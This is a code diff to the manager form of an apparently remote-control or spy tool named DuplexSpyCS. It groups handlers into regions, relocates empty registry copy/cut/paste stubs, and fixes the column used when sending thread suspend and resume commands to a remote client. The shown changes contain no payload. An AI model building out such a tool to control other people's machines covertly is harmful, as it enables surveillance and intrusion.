@@ -2029,6 +2029,8 @@ namespace DuplexSpyCS
             Window_ReqInit();
         }
 
+        #region Controls events
+
         private void frmManager_Load(object sender, EventArgs e)
         {
             setup();
@@ -2580,6 +2582,8 @@ namespace DuplexSpyCS
             f.ShowDialog();
         }
 
+        #region Registry
+
         //Reg - Export
         private void toolStripMenuItem36_Click(object sender, EventArgs e)
         {
@@ -2682,6 +2686,40 @@ namespace DuplexSpyCS
             new Thread(() => Reg_ReqValueDelete(currentPath, keyNames)).Start();
         }
 
+        //Reg - Key Copy
+        private void toolStripMenuItem43_Click(object sender, EventArgs e)
+        {
+
+        }
+        //Reg - Key Cut
+        private void toolStripMenuItem44_Click(object sender, EventArgs e)
+        {
+
+        }
+        //Reg - Key Paste
+        private void toolStripMenuItem45_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        //Reg - Value Copy
+        private void toolStripMenuItem54_Click(object sender, EventArgs e)
+        {
+
+        }
+        //Reg - Value Cut
+        private void toolStripMenuItem55_Click(object sender, EventArgs e)
+        {
+
+        }
+        //Reg - Value Paste
+        private void toolStripMenuItem56_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        #endregion
+
         private void toolStripButton6_Click(object sender, EventArgs e)
         {
             File_FindStartup();
@@ -2704,42 +2742,14 @@ namespace DuplexSpyCS
             }
         }
 
-        //Reg - Key Copy
-        private void toolStripMenuItem43_Click(object sender, EventArgs e)
-        {
-
-        }
-        //Reg - Key Cut
-        private void toolStripMenuItem44_Click(object sender, EventArgs e)
-        {
-
-        }
-        //Reg - Key Paste
-        private void toolStripMenuItem45_Click(object sender, EventArgs e)
-        {
-
-        }
+        
 
         private void treeView3_KeyDown(object sender, KeyEventArgs e)
         {
 
         }
 
-        //Reg - Value Copy
-        private void toolStripMenuItem54_Click(object sender, EventArgs e)
-        {
-
-        }
-        //Reg - Value Cut
-        private void toolStripMenuItem55_Click(object sender, EventArgs e)
-        {
-
-        }
-        //Reg - Value Paste
-        private void toolStripMenuItem56_Click(object sender, EventArgs e)
-        {
-
-        }
+       
 
         private void richTextBox1_KeyDown(object sender, KeyEventArgs e)
         {
@@ -3084,7 +3094,7 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView5.SelectedItems)
             {
-                int nHandle = int.Parse(item.SubItems[3].Text);
+                int nHandle = int.Parse(item.SubItems[4].Text);
                 v.SendCommand($"thread|suspend|{nHandle}");
             }
         }
@@ -3093,9 +3103,11 @@ namespace DuplexSpyCS
         {
             foreach (ListViewItem item in listView5.SelectedItems)
             {
-                int nHandle = int.Parse(item.SubItems[3].Text);
+                int nHandle = int.Parse(item.SubItems[4].Text);
                 v.SendCommand($"thread|resume|{nHandle}");
             }
         }
+
+        #endregion
     }
 }
